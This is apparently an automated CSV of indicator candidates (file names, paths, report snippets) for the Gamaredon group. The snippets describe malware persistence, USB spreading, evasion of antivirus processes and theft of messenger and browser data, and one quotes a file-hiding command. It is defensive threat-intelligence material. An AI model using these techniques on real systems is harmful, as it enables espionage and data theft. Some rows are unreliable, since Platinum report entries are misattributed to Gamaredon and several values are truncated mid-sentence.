1.0.0,actor--gamaredon,artifact--sha256:e0980b67a5ae57876167d86755401c3749294d11b7b6c4a1c308499ae1b96d33,observation--sha256:7fbbcd8f62941ec9b63e4390af976fbc01a3b02cc86655f9708330b29ddd1925,file-name,start.exe,start.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"18 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 13. The SFX config embedded in PteroSetup On execution, PteroSetup scans USB, mapped network, and fixed drives (except for the C: drive) for files with the .exe extension whose names contain one of the following substrings: install , setup, or cronos . Note that the files targeted by PteroSetup are not necessarily PE files, and can be of any type, since PteroSetup does not verify their contents, but for conve",
1.0.0,actor--gamaredon,artifact--sha256:e0980b67a5ae57876167d86755401c3749294d11b7b6c4a1c308499ae1b96d33,observation--sha256:ae5ec241129ccfd4a240616de2cb84d7810a5203666983c410f29c127395d67f,file-name,start.exe,start.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:7d27c383e1904f427dfc06efb7a3a9f4966a4d98cca9f51b7fc1504f7e0273ee,file-name,svchost.exe,svchost.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Hot patcher One of PLATINUM’s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to perform this task, it also takes advantage of an obscure operating system feature known as hot patching. Hot patching is an operating system-supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches ",
1.0.0,actor--gamaredon,artifact--sha256:8d2e5897e81411775ca95335be85f90b12a1933bd3483463efea26b9222fcd37,observation--sha256:f8ac426fabaf8cb5e510bd07a3d9c516b96bc83600d7ac40ba0d6c792877d97d,file-name,test.ps1,test.ps1,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:8d2e5897e81411775ca95335be85f90b12a1933bd3483463efea26b9222fcd37,observation--sha256:1f8efb5ecf214bc02d61ad842a10ee2e495e6c6a5164e28d47b0019916bcff06,file-name,test.ps1,test.ps1,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:a7ac0ad0dc013bc8df7f1ccbc73fbd701341648c5fb2ad4017c392ebc3652b43,observation--sha256:afb5bab587fc3487462b3c231b8eff840a91ce7d37b849aa003ac84bc7033079,file-name,time.php,time.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:a0e88312fb76b43362989c316c283067a7103ea2fa6877280be118a5bdc3f9c3,observation--sha256:61cdce3aad5904f611f86bd03309f811963ba06dac8b02b7060e3e2afbb0da30,file-name,tor.exe,tor.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:a0e88312fb76b43362989c316c283067a7103ea2fa6877280be118a5bdc3f9c3,observation--sha256:ef94902ad5a3d81dc819485da8f123feaf8c6f6072e0e1380f7f214d440f4644,file-name,tor.exe,tor.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 46}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"46 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value Mutexes %PROCESSOR_IDENTIFIER% %COMPUTERNAME% Scheduled task names dropbox %COMPUTERNAME% %COMPUTERNAME%_1 APPENDIX G: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPSDOOR Name Value Installation paths HKCU\Software \[a-zA-Z0-9]{19,25} HKCU\Abstractions \[a-zA-Z0-9]{19,25} HKCU\AppEvents \[a-zA-Z0-9]{19,25} HKCU\Printers \[a-zA-Z0-9]{19,25} %USERPROFILE% \%PROCESSOR_LEVEL%_%PROCESSOR_REVISION% \data\geoip %US",
1.0.0,actor--gamaredon,artifact--sha256:f5702954165b56c7a6e0a6aa240fe366976d3e2ad5d45e9e19098a27ec2da7d7,observation--sha256:622b0a2fda4d6166410655229b03283755ce6785dbda61d3ebacef06d2b4f0ba,file-name,tron.cmd,tron.cmd,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The virus provides the following actions: the virus copies its files to the operating system startup folders %APPDATA%\Microsoft\Windows\Start and Menu\Programs\Startup, and registers itself in the task scheduler (Figure 6) in order to wait for action from the command & control server (C2). In earlier versions, command & control servers were hard - coded, but from 2019 the SSU noticed additional configuration files with backup С2 list. Figure 6. An example which demonstrate unauthorized schedule",
1.0.0,actor--gamaredon,artifact--sha256:15aa40f9e09d13729fe19eaecd0790040118e9870763136cdc505887aeb83bbf,observation--sha256:b6cadd911ec6fad50857b98c1a84909871da64cf7c93c18659fb6801c36a007f,file-name,volumeinfo.ps1,volumeinfo.ps1,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:15aa40f9e09d13729fe19eaecd0790040118e9870763136cdc505887aeb83bbf,observation--sha256:d9703cf1f9e289334bf9b017d174fdc948c137e55baa2bf06fea90341d74fb14,file-name,volumeinfo.ps1,volumeinfo.ps1,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:80cb04e4336493f114c0c69973db382f9d313210ce64be7b438a6b3d7cfff35d,observation--sha256:5fe000d31b553468a3769f47f081806acfc4f412b45eb464185d32dd8d671b16,file-name,winlogon.exe,winlogon.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Hot patcher One of PLATINUM’s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to perform this task, it also takes advantage of an obscure operating system feature known as hot patching. Hot patching is an operating system-supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches ",
1.0.0,actor--gamaredon,artifact--sha256:8f888f9043df3ecdb45a91c94d30835b4346a509e5734b07591e2f82887c0834,observation--sha256:a9deb9045d2cb16bd3175559384922beb7c26ebecd005f8747b28b64cb3717d1,file-name,winrestore.dll,winrestore.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"winrestore.dll is a tool responsible for creating and collecting screenshots. It should be noted that the set of modules changed with every new wave of attack, with the expectation of loading the necessary components after fixing in the system (depending on current needs). At the same time, the servers are configured in such way that attempts to load the malware components for research were unsuccessful, and the server response was 404 Not Found. This is due to additional settings/ parameters of",
1.0.0,actor--gamaredon,artifact--sha256:039e4f87f37dcee3fd2856928fa7db835eb4d80e00b876184e83975970f057fc,observation--sha256:34aa7590584c613f283fdae9d789763e1cd0b5f005547d3bcca5a582e11061d8,file-name,wireshark.exe,wireshark.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The exchange of such electronic documents actually creates a technical channel for the distribution of malware through trusted sources. Avoiding detection and c hecking the operational environment In the process of evolution of malicious software, it was found that its functionality involves checking the startup environment, the operation of network monitoring tools and the presence of antivirus software . The group’s use of the following techniques was recorded: - pinging Google DNS servers wit",
1.0.0,actor--gamaredon,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:5a65c406124289577773046ebd209438d36a30c39f21db4cafd3335411245eb7,file-name,(wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Having created conditions for constant presence in the system and receiving constant requests from the victim's system, the group filters bots with the main malicious software. Also since the end of 2019, Armageddon started to implement VBSscipts, which completely replaced cmd files later and became the main scripts for the malware Pterodo functionality to be deployed in the system, to maintain persistence and download new specialized modules. Full usage of VBSscipts group has begun in 2020 and ",
1.0.0,actor--gamaredon,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:13612391897a8a597c05aa0c39cf81ddf8791f760e89bc4c0f3a7d79f024778f,file-name,wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 4. PteroDum Capabilities PteroDum can fetch and execute up to 10 VBScript payloads from a hardcoded C&C server. When PteroDum receives a response, it expects that response to be a base64 -encoded VBScript with ;; tokens inserted at random positions. After removing those tokens and decoding the result, PteroDum stores the VBScript in a randomly named file with a .vbs extension in the system temporary directory",
1.0.0,actor--gamaredon,artifact--sha256:3adce80f40d9e73515c59a746a36ab1c525e92e430657568a4d61f868e0ce5bb,observation--sha256:49aca4306b6d0ed6b8336e581fe6d5c7a8eac2a09460242134197c082468d569,file-name,zhudongfangyu.exe,zhudongfangyu.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:d5bd433567fbd571a2c5053141fdce0e9a705aea96a05e55ef10a1093a2173c4,observation--sha256:4078a0a76d2b0b544f9ce2286d15875fd53c91c761df189dae708aec6857a2cb,file-path,%APPDATA%\ Microsoft\ Windows\SendTo mega:,%APPDATA%\ Microsoft\ Windows\SendTo mega:,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:2faf10f169779a1398d26442d4c6a8c1cfce6ad0437f91911415400cfb5aa4bb,observation--sha256:7c6e21e1932f2b2c4fda8beb467b296764ac2e52457d6ca9276483d935146424,file-path,%APPDATA%\ Microsoft\ Windows\Start Menu\ Programs\ Startup mega:,%APPDATA%\ Microsoft\ Windows\Start Menu\ Programs\ Startup mega:,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:5ebf02f85b8ec736e18fa2e056e9f5cf0f04c4893202e6f9bf244aba1d9bb803,observation--sha256:f796092367ec1c2c1e126d23eb7567a18036e03b7f2161b35018c5b0ef7a46a7,file-path,"%APPDATA%\Defrag , naming them","%APPDATA%\Defrag , naming them",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:2db56e1717ef3134f6978d2db08b090e64dbe25a1635fe125c9b39ac0d7b457b,observation--sha256:7235ae9794653b58ea9666e14cd00c5042d5e45c4dc5147e176c8a1f1e9f4dce,file-path,%APPDATA%\Local\Temp\7ZipSfx.000 (instead of,%APPDATA%\Local\Temp\7ZipSfx.000 (instead of,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:0f95e755437779a4b213cab6238e82f7d3a7a7fd0f6e41279d9279fbb4cce235,observation--sha256:ee45634a20721204c76dd58a21f8a7aabea78e53dca0ec64b672e4224ef17121,file-path,%APPDATA%\Microsoft\Crypto\keys\ with the name of the,%APPDATA%\Microsoft\Crypto\keys\ with the name of the,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:069086cec5585ada0899e5fc9dc5693ac87960e7700374ed3c6c6fcf8cee3167,observation--sha256:4ad6ebc28968499aaa1e4b4d4131ebff8888eae73971ebd2957f08bc419e441f,file-path,%APPDATA%\Microsoft\Crypto\keys\serial number of,%APPDATA%\Microsoft\Crypto\keys\serial number of,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Once persistence mechanism is implemented in the victim's system, the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory %APPDATA%\Microsoft\Crypto\keys\serial number of the volume \executable file every 5 minutes. During the copying process, the file name is changed, and the file hidin g attributes are set to attrib +h +s /s E:\***.exe A shortcut called New folder is created on the attached media through the marker ""3"" from the s",
1.0.0,actor--gamaredon,artifact--sha256:1c1f5efb06953831094a5963a8c920c0e7521ad338fb30bec6790e9b92e9fb19,observation--sha256:245d4ea1e7fdc4420ce5b24475296ce543fb8bd132d60516f9f84df835c62ac4,file-path,%APPDATA%\Microsoft\Windows\Start and,%APPDATA%\Microsoft\Windows\Start and,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The virus provides the following actions: the virus copies its files to the operating system startup folders %APPDATA%\Microsoft\Windows\Start and Menu\Programs\Startup, and registers itself in the task scheduler (Figure 6) in order to wait for action from the command & control server (C2). In earlier versions, command & control servers were hard - coded, but from 2019 the SSU noticed additional configuration files with backup С2 list. Figure 6. An example which demonstrate unauthorized schedule",
1.0.0,actor--gamaredon,artifact--sha256:5471b945afd120ba03527326c988d7978bbe8849afe1b095cc74af101f2a70e5,observation--sha256:c7b951f13648a4852aff4a45457172b623f180342feb059f877a8a4d9c0ba883,file-path,%APPDATA%\Mozilla\Firefox\Profiles\; PteroCookie exfiltrates an SQLite database named,%APPDATA%\Mozilla\Firefox\Profiles\; PteroCookie exfiltrates an SQLite database named,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:1115dc7ab2c86047a592a9f34438d18eeb957480c53b22456e77483fbd16cae2,observation--sha256:9e6739edcacd818d3df076aa0ad9be9063284ccaca7a4dd6fbf1530965cd535a,file-path,%APPDATA%\Nitro\,%APPDATA%\Nitro\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:76c8e04f50b7909fd9f3d3d5caf660a0eb4bcc09600ee261192b13c793623a32,observation--sha256:b9f3c410f846a0c6e981a56d71ffe3d594cbb432c04c615371b4e07135c9efda,file-path,"%APPDATA%\Signal\config.json , allowing","%APPDATA%\Signal\config.json , allowing",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:eb5974e87480df810efa480e85c8a8d12cc19ec0b55c3f725bafc92fc4516ab1,observation--sha256:ac9502f9b12d93aec25635b539a255cfcc4659057e822d13e7875169735d4fe6,file-path,"%APPDATA%\Signal\sql\db.sqlite , contains sensitive information like sent and received messages. The","%APPDATA%\Signal\sql\db.sqlite , contains sensitive information like sent and received messages. The",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:e58f96dfd2ee20dfbc7d3e9a9745a5871df5fc5e60af2d0ba609327a8e69c9ed,observation--sha256:09015c1d252fe42e9ca5f5cdbc1ff45ad689104d8bb832281fbc8941775c1ebd,file-path,%APPDATA%\Signal\sql\db.sqlite  is present on the,%APPDATA%\Signal\sql\db.sqlite is present on the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:7efa792b42851952f9780f632b43cab7756c2c73993bd721b8303ab484ef8fed,observation--sha256:09e8fec7665a8c78f7703e852b5786480efc40100297b7cc13152e21662fa99e,file-path,"%APPDATA%\Telegram Desktop \tdata directory , perhaps to keep the stolen session unique .","%APPDATA%\Telegram Desktop \tdata directory , perhaps to keep the stolen session unique",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:58b9e7f94011424e3997cbac9fb3c414007490868c3a5232b632125b8d01e7b8,observation--sha256:e9a803292fa789b15bf08a4c6dedc9eba84037971b60c0f53729a50445a37703,file-path,%APPDATA%\Telegram Desktop \tdata with names that are 16 characters long and exfiltrates all files,%APPDATA%\Telegram Desktop \tdata with names that are 16 characters long and exfiltrates all files,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:8eac8f301436657a03727eb2d4718820f1c962cdcd3e2069d02b0ab80d2e54cf,observation--sha256:5bbbaca4b02de4a817f8a48037fd4d1b4d3294aa2ed3bda9307676d1053f4b87,file-path,"%APPDATA%\Telegram Desktop \tdata, then terminates the Telegram process and deletes the entire","%APPDATA%\Telegram Desktop \tdata, then terminates the Telegram process and deletes the entire",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
